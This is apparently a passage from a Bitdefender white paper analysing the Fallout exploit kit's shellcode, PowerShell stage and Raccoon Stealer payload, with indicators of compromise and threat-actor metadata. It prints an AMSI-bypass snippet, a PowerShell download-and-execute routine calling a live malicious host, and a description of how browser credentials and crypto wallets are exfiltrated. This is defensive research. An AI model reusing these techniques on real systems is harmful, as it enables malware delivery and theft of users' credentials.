table:\n\nkernel32.dll\n\n0 = GetModuleHandleA\n\n4 = LoadLibraryA\n\n8 = CreateToolhelp32Snapshot\n\nC = Process32First\n\n10 = Process32Next\n\n14 = CloseHandle\n\n18 = VirtualAlloc\n\n1C = CreateProcessA\n\n20 = ExitProcess\n\n24 = ExitThread\n\nntdll.dll\n\n0 = memset\n\nwininet.dll\n\n0 = InternetOpenA\n\n4 = InternetConnectA\n\n8 = InternetCloseHandle\n\nC = HttpOpenRequestA\n\n10 = HttpSendRequestA\n\n14 = HttpQueryInfoA\n\n18 = InternetReadFile\n\n[All strings are stored encrypted in the shellcode, and decrypted before use. The encryption algorithm is RC4, recognized by the](https://en.wikipedia.org/wiki/RC4)\n[key scheduling step, in the decompiled shellcode:](https://www.hex-rays.com/products/decompiler/)\n\n**for(v3 = 0; v3 < 0x100; v3++)**\n\n{\n\nKS_state_array[v3] = v3;\n\n}\n\nLOBYTE(v4) = 0;\n\n**for(v5 = 0; v5 < 0x100; v5++)**\n\n{\n\nv6 = KS_state_array[v5];\n\nv4 = (BYTE)(v4 + *(BYTE*)((v5 & 7) + v2) + v6);\n\n\n-----\n\nWhite Paper\n\nKS_state_array[v4] = v6;\n\n}\n\n###### Next, the shellcode checks if it is running in a virtual machine. This is done using the CPUID instruction, leaf 1, where the reserved bit 31 of ecx is set when hypervisor is present.\n\n01000384 33 C0         xor   eax, eax\n\n01000386 8B F9         mov   edi, ecx       ; edi = destination\n\n01000388 40           inc   eax          ; eax = leaf\n\n01000389 33 C9         xor   ecx, ecx\n\n0100038B 53           push  ebx\n\n0100038C 0F A2         cpuid             ; leaf=1, get processor\nfeatures in ecx,edx\n\n0100038E 8B F3         mov   esi, ebx\n\n01000390 5B           pop   ebx\n\n01000391 8D 5D F0        lea   ebx, [ebp+var_10]\n\n01000394 89 03         mov   [ebx], eax\n\n01000396 89 73 04        mov   [ebx+4], esi\n\n01000399 89 4B 08        mov   [ebx+8], ecx\n\n0100039C 89 53 0C        mov   [ebx+0Ch], edx\n\n0100039F 8B 45 F8        mov   eax, [ebp+var_10+8]  ; get ecx\n\n010003A2 C1 E8 1F        shr   eax, 1Fh       ; ecx bit 31: hypervisor\npresence\n\n010003A5 89 07         mov   [edi], eax\n\nThe shellcode also checks for the presence of debugging tools. This is done by enumerating processes, then hashing their\nprocess names, and comparing them against a few predefined values:\n\n010002D3 E8 06 FF FF FF     call  hash_string      ; hash current process name\n\n010002D8 5E           pop   esi\n\n010002D9 3D DE 06 54 3F     cmp   eax, 3F5406DEh    ; hash of “processhacker.exe”\n\n010002DE 74 1F         jz   short loc_10002FF   ; compare hashes\n\nUsing this method, the presence of the following processes is determined:\n\nprocesshacker.exe\n\nwireshark.exe\n\nida64.exe\n\nwindbg.exe\n\nfiddler.exe\n\nAfter checking the execution environment, the shellcode decrypts the target host name and path for downloading the malware\nexecutable. The decryption uses the same hardcoded RC4 key, on a buffer stored at the end of the shellcode. The first 0x40\nencrypted bytes contain the host name, then the next 0x80 contain the relative path:\n\n0100000F E8 B0 08 00 00     call  get_ptr_to_ecnrypted_data\n\n01000014 8B F0         mov   esi, eax         ; esi = encrypted_data\n\n...\n\n010000A2 8D 4C 24 20      lea   ecx, [esp+0E0h+rc4_key]\n\n010000A6 6A 40         push  40h\n\n010000A8 56           push  esi\n\n010000A9 E8 FE 02 00 00     call  rc4_decrypt        ; decrypt “yourfirmware.biz”\n\n010000AE 83 C6 40        add   esi, 40h\n\n010000B1 8D 4C 24 28      lea   ecx, [esp+0E8h+rc4_key]\n\n010000B5 68 80 00 00 00     push  80h\n\n010000BA 56 push esi\n\n\n-----\n\nWhite Paper\n\nmythus/…”\n\nHaving the target host, the shellcode connects to it securely, using a custom user-agent string (eW71txlgM5lhDn98),\ndecrypted using the same RC4 key:\n\n01000520 C7 45 C0 F2 72 54 9A  mov   [ebp+var_user_agent_string], 0C77A39CEh\n\n01000527 C7 45 C4 3E 84 3B 29  mov   [ebp+var_3C], 0F7EFEB9Eh\n\n0100052E 6A 08         push  8\n\n01000530 50           push  eax\n\n01000531 E8 76 FE FF FF     call  rc4_decrypt        ; decrypt\n“eW71txlgM5lhDn98”\n\n...\n\n01000541 50           push  eax            ; var_user_agent_string\n\n01000542 FF 55 F8        call  [ebp+InternetOpenA]    ; InternetOpenA\n\n...\n\n0100055B 68 BB 01 00 00     push  443            ; https, port 443\n\n01000560 FF 75 F4        push  [ebp+var_host]\n\n01000563 57           push  edi\n\n01000564 FF 55 F0        call  [ebp+InternetConnectA]  ; InternetConnectA\n\nAfter connection, the shellcode performs a POST request, sending over a 4-byte value, which tells the server if a virtual\nmachine or debugging tools were detected. If these tools were present, the server will provide an empty reply. If they were not\npresent, the server response is the encrypted payload:\n\n010004D9 83 7D 20 00      cmp   [ebp+arg18_virtualized_flag], 0\n\n...\n\n010004E4 75 18         jnz   short loc_10004FE\n\n010004E6 83 7D 24 00      cmp   [ebp+arg1C_debugger_flag], 0\n\n010004EA 75 09         jnz   short loc_10004F5\n\n010004EC C7 45 14 C2 50 5F C8  mov   [ebp+post_data], 0CB4835EAh ; no debugging, no vmware\n\n010004F3 EB 1D         jmp   short loc_1000512\n\n010004F5 C7 45 14 D3 43 5F C8  mov   [ebp+post_data], 0CB4826FBh ; debugging detected\n\n010004FC EB 14         jmp   short loc_1000512\n\n010004FE 83 7D 24 00      cmp   [ebp+arg1C_debugger_flag], 0\n\n01000502 C7 45 14 D6 51 5F C8  mov   [ebp+post_data], 0CB4834FEh ; vmware + debugging\ndetected\n\n01000509 75 07         jnz   short loc_1000512\n\n0100050B C7 45 14 D6 5E 5F C8  mov   [ebp+post_data], 0CB483BFEh ; vmware detected\n\nIf POST data was “correct” and debugging tools were not running, shellcode downloads the encrypted command line:\n\n01000618 8D 45 CC        lea   eax, [ebp+var_34]\n\n0100061B 50           push  eax\n\n0100061C 8B 45 0C        mov   eax, [ebp+arg4_buffer]\n\n0100061F FF 75 1C        push  [ebp+content_length]\n\n01000622 FF 30         push  dword ptr [eax]\n\n01000624 53           push  ebx\n\n01000625 FF 55 C8        call  [ebp+InternetReadFile]  ; InternetReadFile\n\n...\n\n0100064A 8B 45 0C        mov   eax, [ebp+arg4_buffer]\n\n0100064D FF 75 1C        push  [ebp+content_length]\n\n01000650 8B 4D 08        mov   ecx, [ebp+arg0_rc4_key]\n\n01000653 FF 30         push  dword ptr [eax]\n\n01000655 E8 52 FD FF FF     call  rc4_decrypt\n\nAfter decrypting the command line, it is executed using the CreateProcessA function:\n\n\n-----\n\nWhite Paper\n\n01000121 53           push  ebx\n\n01000122 53           push  ebx\n\n01000123 68 00 00 00 08     push  8000000h         ; CREATE_NO_WINDOW\n\n01000128 53           push  ebx\n\n01000129 53           push  ebx\n\n0100012A 53           push  ebx\n\n0100012B FF 74 24 50      push  [esp+0F8h+var_buffer]   ; decrypted command line\n\n0100012F 53           push  ebx            ; application name = NULL\n\n01000130 FF 54 24 64      call  [esp+100h+CreateProcessA] ; CreateProcessA\n\n[The command line is an invocation of hidden, non-interactive PowerShell interpreter, along with encoded script provided as a](https://en.wikipedia.org/wiki/PowerShell)\nparameter, for a total of 5,809 characters:\n\npowershell.exe -w hidden -noni -enc\ndAByAHkAewAkAEkAbABsAEkASQAxAEkASQAxAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5ADsA[...]\n\n\n-----\n\nWhite Paper\n\n### PowerShell code\n\nAfter Base64 decoding the parameter from the command line, we get the PowerShell code that gets executed. Its first action is\n[to disable the Windows Antimalware Scan Interface (AMSI) to evade malicious script detection.](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)\n\nThis is done by setting the System.Management.Automation.AmsiUtils object’s amsiInitFailed property to true.\nStrings are Base64 encoded for obfuscation.\n\n_# disable AMSI_\n\n$IllII1II1 = [Ref].Assembly;\n\n$IIIl11IIl1ll = $IllII1II1.GetType([Text.Encoding]::ASCII.\nGetString([Convert]::FromBase64String(\n\n‚U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=‘)));\n\n_# System.Management.Automation.AmsiUtils_\n\n$l1IIllll = $IIIl11IIl1ll.GetField([Text.Encoding]::ASCII.\nGetString([Convert]::FromBase64String(\n\n‚YW1zaUluaXRGYWlsZWQ=‘)), ‚NonPublic,Static‘); # amsiInitFailed\n\n$l1IIllll.SetValue($null, $true);\n\nNext, it obtains direct access to the CreateProcess function, by adding a .NET class that uses DllImport on the\nkernel32.dll module:\n\n_# import CreateProcess_\n\nAdd-Type -TypeDefinition “using System; using System.Diagnostics; [...]\n\npublic static class lI1IllI {\n\n[DllImport(“”kernel32.dll””,SetLastError=true)]\n\npublic static extern bool CreateProcess(string llIll1l1,string IIIll11,IntPtr lll1l,IntPtr\nlIII1l1I,bool l11Il1ll1I1,\n\nuint llI11l1llIll,IntPtr III1I1I11lII, string Illl1,ref ll11lI IIIlIlll111,out\nllIIIll11Il l111l); }”;\n\nThe malware executable is downloaded in the local AppData folder with a random name and .tmp extension, then executed\nusing the CreateProcess function imported earlier:\n\n_# setup dropped file name_\n\n$Illll1lll111=”$env:userprofile\\AppData\\LocalLow\\$(-join((48..57)+(65..90)+(97..122)|Get-Ran­\ndom -Count 8|%{[char]$_})).tmp”;\n\n_# download malware_\n\n$llIlIl1l1l1=‘http://yourfirmware.biz/4960-Englut-mythus/Sixfold/2ZX2/12042?AX2Q5=Dreamiest&\nRAyvt=Bowable_5636&nCAa=13104‘;\n\n[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(‚JGNsaT0oTmV3LU9iamVjdCBOZXQuV­\n2ViQ2xpZW50KTskY2xpL[...]‘))|iex;\n\n_# base64 decoded and executed code:_\n\n_# $cli=(New-Object Net.WebClient); $cli.Headers[‚User-Agent‘]=‘eW71txlgM5lhDn98‘;_\n\n_# $cli.DownloadFile($llIlIl1l1l1,$Illll1lll111);_\n\n_# run malware_\n\n$lllIlIIIIIl = New-Object ll11lI; # STARTUPINFO\n\n$lllIlIIIIIl.lI1ll1II = 0x0;\n\n$lllIlIIIIIl.Il1111 = [System.Runtime.InteropServices.Marshal]::SizeOf($lllIlIIIIIl);\n\n$II1III = New-Object llIIIll11Il; # PROCESS_INFORMATION\n\n[lI1IllI]::CreateProcess($Illll1lll111,$Illll1lll111,[IntPtr]::Zero,[IntPtr]::Zero,$false,0x\n00000008,[IntPtr]::Zero,”c:”,[ref]$lllIlIIIIIl,[ref]$II1III)|out-null;\n\n\n-----\n\nWhite Paper\n\n### Raccoon Stealer\n\nThe final malware payload is Racoon Stealer, downloaded and launched by the PowerShell code.\n\nThe executable we are analyzing has the MD5 hash of d490bd6184419561350d531c6c771a50 and has 1,383,936 bytes.\n[Some HTTP requests are recognized by EKFiddle tool as RaccoonStealer C2 calls. It is indeed a password and crypto](https://github.com/malwareinfosec/EKFiddle)\nstealer, as we will see below. This particular sample is detected by Bitdefender as Trojan.Agent.EDOT.\n\n[First, it sends a “log” request to the nginx application at http://34.77.205.80/gate/log.php, with information includ­](https://www.nginx.com/)\ning a bot_id based on computer configuration, and receives a JSON containing details about dependencies locations and\nexfiltration URL:\n\n{\n\n“url”:”http://34.77.205.80/file_handler/file.php?hash=71f03823790054ac09e59edde52e5bd­\nf2955aa82&js=06d7c4ec30ad085c39fd5e491691497dae449425&callback=hxxp://34.77.205.80/gate”,\n\n“attachment_url”:”http://34.77.205.80/gate/sqlite3.dll”,\n\n“libraries”:”http://34.77.205.80/gate/libs.zip”,\n\n“ip”:”[redacted]”,\n\n“config”:{\n\n“masks”:null,\n\n“loader_urls”:null\n\n},\n\n“is_screen_enabled”:0,\n\n“is_history_enabled”:0\n\n}\n\n[Next, it downloads what looks like FoxMail components from /gate/libs.zip, but we did not see any email being sent. It](https://www.foxmail.com/)\n[also downloads the SQLite library, for parsing browser database files, from /gate/sqlite3.dll.](https://www.sqlite.org/index.html)\n\nLogin credentials, auto-fill information and cookies are collected from the following browsers:\n\n    - **Google Chrome, Google Chrome Canary, Vivaldi, Xpom, Comodo Dragon, Amigo, Orbitum, Opera, Bromium, Nichrome,**\nSputnik, Kometa, uCoz Uran, RockMelt, 7Star, Epic Privacy Browser, Elements Browser, CocCoc, TorBro, Shuhba,\nCentBrowser, Torch, Chedot, Superbird\n\n    - **Mozilla Firefox, Waterfox, SeaMonkey, Pale Moon**\n\nCredentials are also collected for the following crypto wallets:\n\n    - Electrum\n\n    - Ethereum\n\n    - Exodus\n\n    - Jaxx\n\n    - Monero\n\nStolen data, along with machine and OS information is packed into a Log.zip file and exfiltrated to the address specified in\nthe JSON, at 34.77.205.80/file_handler/[...].\n\nA request is also made to download a file from Google Drive at hxxps://drive.google.com/uc?export=down­\nload&id=1l34XG2K[...] but at the time of analysis, the file was empty.\n\nWhen finished, the malware attempts to delete itself using the ping utility as sleep tool:\n\ncmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q “C:\\...\\AppData\\LocalLow\\pofke3lb.tmp”\n\n\n-----\n\nWhite Paper\n\n### Indicators of Compromise\n\nWe have seen the following IPs used for the malicious ad server:\n\n- 91.90.192.214\n\n- 91.90.195.48\n\n- 103.29.71.177\n\n- 139.162.90.20\n\n- 139.162.100.103\n\n- 172.105.14.31\n\n- 172.105.36.165\n\nWe have seen the following domains being used for the main exploit kit server:\n\n- gorgantuaisastar.com\n\n- gonzalesnotdie.com\n\n- comicsansfont.com\n\n- yourfirmware.biz\n\nFlash exploit samples associated with the exploit kit:\n\n- c9d17e11189931677cd7ab055079fc45 (35,140 bytes)\n\n- 4a59222d224c8dbfae1283dde73f52db (35,127 bytes)\n\n- a58584b73a08342a80e5ca8d1ac3dc2a (13,664 bytes)\n\nRaccoonStealer malware samples delivered by the exploit kit:\n\n- 97d329f9a8ba40cc6b6dd1bb761cbe5c (1,568,768 bytes)\n\n- d490bd6184419561350d531c6c771a50 (1,383,936 bytes)\n\n\n-----\n\nWhite Paper\n\n### References\n\n- [Fiddler, web debugging proxy – https://www.telerik.com/fiddler](https://www.telerik.com/fiddler)\n\n- [EKFiddle, malicious traffic analyzer Fiddler plugin – https://github.com/malwareinfosec/EKFiddle](https://github.com/malwareinfosec/EKFiddle)\n\n- [VBScript no longer supported in IE11 – https://docs.microsoft.com/en-us/previous-versions/windows/internet-explor­](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/dn384057(v=vs.85))\n[er/ie-developer/compatibility/dn384057(v=vs.85)](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/dn384057(v=vs.85))\n\n- [Diffie-Hellman key exchange – https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)\n\n- [Advanced Encryption Standard algorithm – https://en.wikipedia.org/wiki/Advanced_Encryption_Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)\n\n- [Metasploit Penetration Testing Framework – https://www.metasploit.com/](https://www.metasploit.com/)\n\n- [Metasploit module for CVE-2018-8174 – https://github.com/0x09AL/CVE-2018-8174-msf](https://github.com/0x09AL/CVE-2018-8174-msf)\n\n- [Microsoft Internet Explorer 11 (Windows 7 x86/x64), VBScript Code execution – https://www.exploit-db.com/ex­](https://www.exploit-db.com/exploits/44741)\n[ploits/44741](https://www.exploit-db.com/exploits/44741)\n\n- [CVE-2018-8174, National Vulnerability Database – https://nvd.nist.gov/vuln/detail/CVE-2018-8174](https://nvd.nist.gov/vuln/detail/CVE-2018-8174)\n\n- [New Office Attack Using Browser “Double Kill” Vulnerability, by 360 Security – https://www.weibo.com/ttarticle/p/](https://www.weibo.com/ttarticle/p/show?id=2309404230886689265523)\n[show?id=2309404230886689265523](https://www.weibo.com/ttarticle/p/show?id=2309404230886689265523)\n\n- The King is dead. Long live the King! Root cause analysis of the latest Internet Explorer zero day – CVE-2018-8174, by\n[Vladislav Stolyarov, Boris Larin, Anton Ivanov https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/](https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/)\n\n- [Delving deep into VBScript. Analysis of CVE-2018-8174 exploitation, By Boris Larin https://securelist.com/delving-deep-](https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/)\n[into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/](https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/)\n\n- [Analysis of CVE-2018-8174 VBScript 0day and APT actor related to Office targeted attack, by 360 Core Security http://](http://blogs.360.cn/post/cve-2018-8174-en.html)\n[blogs.360.cn/post/cve-2018-8174-en.html](http://blogs.360.cn/post/cve-2018-8174-en.html)\n\n- The APT-C-06 organization’s first APT attack analysis and traceability initiated by the “double kill” 0day vulnerability (CVE[2018-8174), by 360 Security – https://4hou.win/wordpress/?p=19851](https://4hou.win/wordpress/?p=19851)\n\n- [Analysis of VBS exploit CVE-2018-8174, by Piotr Florczyk https://github.com/piotrflorczyk/cve-2018-8174_analysis](https://github.com/piotrflorczyk/cve-2018-8174_analysis)\n\n- An Analysis of the DLL Address Leaking Trick used by the “Double Kill” Internet Explorer Zero-Day exploit (CVE-2018-8174),\n[by Dehui Yin https://www.fortinet.com/blog/threat-research/analysis-of-dll-address-leaking-trick-used-by-double-kill-](https://www.fortinet.com/blog/threat-research/analysis-of-dll-address-leaking-trick-used-by-double-kill-internet-explorer-0-day-exploit.html)\n[internet-explorer-0-day-exploit.html](https://www.fortinet.com/blog/threat-research/analysis-of-dll-address-leaking-trick-used-by-double-kill-internet-explorer-0-day-exploit.html)\n\n- [RC4 encryption algorithm, by Ron Rivest – https://en.wikipedia.org/wiki/RC4](https://en.wikipedia.org/wiki/RC4)\n\n- [Interactive Disassembler, Hex-Rays Decompiler – https://www.hex-rays.com/products/decompiler/](https://www.hex-rays.com/products/decompiler/)\n\n- [CPUID Instruction, Intel Instruction Set Reference, page 3-190 – https://www.intel.com/content/dam/www/public/us/](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)\n[en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)\n\n- [Mechanisms to determine if software is running in a VMware virtual machine – https://kb.vmware.com/s/arti­](https://kb.vmware.com/s/article/1009458)\n[cle/1009458](https://kb.vmware.com/s/article/1009458)\n\n- [JPEXS Free Flash Decompiler, by Jindra Petřík – https://www.free-decompiler.com/flash/](https://www.free-decompiler.com/flash/)\n\n- [CVE-2018-15982, National Vulnerability Database – https://nvd.nist.gov/vuln/detail/CVE-2018-15982](https://nvd.nist.gov/vuln/detail/CVE-2018-15982)\n\n- [Operation Poison Needles, by 360 Core Security – http://blogs.360.cn/post/PoisonNeedles_CVE-2018-15982_EN](http://blogs.360.cn/post/PoisonNeedles_CVE-2018-15982_EN)\n\n- [Hacking Team, Wikipedia – https://en.wikipedia.org/wiki/Hacking_Team](https://en.wikipedia.org/wiki/Hacking_Team)\n\n- [CVE-2015-5119 Analysis, Zscaler – https://www.zscaler.com/blogs/research/adobe-flash-vulnerabili­](https://www.zscaler.com/blogs/research/adobe-flash-vulnerability-cve-2015-5119-analysis)\n[ty-cve-2015-5119-analysis](https://www.zscaler.com/blogs/research/adobe-flash-vulnerability-cve-2015-5119-analysis)\n\n- [Antimalware Scan Interface, Microsoft – https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-in­](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)\n[terface-portal](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)\n\n\n-----\n\nWhite Paper\n\n\n-----\n\nWhite Paper\n\n\n-----\n\nBitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of\n\nvalue-added alliances, distributors and reseller partners. Since 2001, Bitdefender has consistently produced award-winning\n\nbusiness and consumer security technology, and is a leading security provider in virtualization and cloud technologies.\nThrough R&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security excellence in both\n\nits number-one-ranked technology and its strategic alliances with the world’s leading virtualization and cloud technology\n\nproviders.\n[More information is available at http://www.bitdefender.com/.](http://www.bitdefender.com/)\n\nAll Rights Reserved. © 2019 Bitdefender. All trademarks, trade names, and products referenced herein are property of their\n\nrespective owners. FOR MORE INFORMATION VISIT: enterprise.bitdefender.com.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.bitdefender.com/files/News/CaseStudies/study/289/Bitdefender-WhitePaper-Fallout.pdf"
    ],
    "report_names": [
        "Bitdefender-WhitePaper-Fallout.pdf"
    ],
    "threat_actors": [
        {
            "id": "a5988309-13cf-4401-b71c-065dee96c568",
            "created_at": "2022-10-25T16:07:23.986472Z",
            "updated_at": "2025-03-27T02:02:10.063805Z",
            "deleted_at": null,
            "main_name": "Operation Poison Needles",
            "aliases": [],
            "source_name": "ETDA:Operation Poison Needles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "36348f49-29a2-4402-82ea-d46a6fd53943",
            "created_at": "2023-01-06T13:46:38.848224Z",
            "updated_at": "2025-03-27T02:00:02.934337Z",
            "deleted_at": null,
            "main_name": "Operation Poison Needles",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation Poison Needles",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2b4eec94-7672-4bee-acb2-b857d0d26d12",
            "created_at": "2023-01-06T13:46:38.272109Z",
            "updated_at": "2025-03-27T02:00:02.790029Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "DUBNIUM",
                "Fallout Team",
                "Luder",
                "Tapaoux",
                "Shadow Crane",
                "APT-C-06",
                "SIG25",
                "Karba",
                "Nemim",
                "Nemin",
                "G0012",
                "ATK52",
                "T-APT-02",
                "TUNGSTEN BRIDGE",
                "Zigzag Hail"
            ],
            "source_name": "MISPGALAXY:DarkHotel",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
            "created_at": "2022-10-25T16:07:23.528994Z",
            "updated_at": "2025-03-27T02:02:09.847683Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "APT-C-06",
                "ATK 52",
                "CTG-1948",
                "Dubnium",
                "Fallout Team",
                "Higaisa",
                "Luder",
                "Operation DarkHotel",
                "Operation Daybreak",
                "Operation Inexsmar",
                "Operation PowerFall",
                "Operation The Gh0st Remains the Same",
                "SIG25",
                "Shadow Crane",
                "T-APT-02",
                "Tungsten Bridge",
                "Zigzag Hail"
            ],
            "source_name": "ETDA:DarkHotel",
            "tools": [
                "Asruex",
                "DarkHotel",
                "DmaUp3.exe",
                "GreezeBackdoor",
                "Karba",
                "Nemain",
                "Nemim",
                "Ramsay",
                "Retro",
                "Tapaoux",
                "Trojan.Win32.Karba.e",
                "Virus.Win32.Pioneer.dx",
                "igfxext.exe",
                "msieckc.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041741,
    "ts_creation_date": 1572369819,
    "ts_modification_date": 1572369823,
    "files": {
        "pdf": "https://archive.orkl.eu/83c800c8e29a6ca6ee3375674ee26fd33a1e1527.pdf",
        "text": "https://archive.orkl.eu/83c800c8e29a6ca6ee3375674ee26fd33a1e1527.txt",
        "img": "https://archive.orkl.eu/83c800c8e29a6ca6ee3375674ee26fd33a1e1527.jpg"
    }
}